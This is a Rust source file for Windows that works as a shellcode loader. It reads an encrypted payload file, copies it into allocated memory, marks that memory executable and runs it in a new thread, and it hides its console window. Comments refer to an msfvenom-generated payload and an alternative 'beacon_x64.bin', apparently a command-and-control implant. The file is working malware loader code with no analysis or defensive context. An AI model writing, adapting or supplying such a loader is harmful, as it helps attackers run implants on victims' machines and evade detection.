#![windows_subsystem = "windows"]
use std::ptr::{copy, null, null_mut};
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError},
    System::{
        Memory::{
            VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        },
        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
    },
};

fn main() {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode = include_bytes!("encrypt.bin");
    // let shellcode = include_bytes!("beacon_x64.bin");

    unsafe {
        println!("hello");
        let address = VirtualAlloc(
            Some(null_mut()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if address.is_null() {
            eprintln!("[!] VirtualAlloc Failed With Error: {:?}", GetLastError());
            return;
        }

        println!("hello");
        copy(shellcode.as_ptr() as _, address, shellcode.len());

        println!("hello");
        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(address, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protection).expect("[!] VirtualProtect Failed With Error");

        println!("hello");
        let hthread = CreateThread(
            Some(null()),
            0,
            Some(std::mem::transmute(address)),
            Some(null()),
            THREAD_CREATION_FLAGS(0),
            Some(null_mut()),
        ).expect("[!] CreateThread Failed With Error");

        println!("hello, world!");
        WaitForSingleObject(hthread, INFINITE);

        let _ = CloseHandle(hthread);
    }
}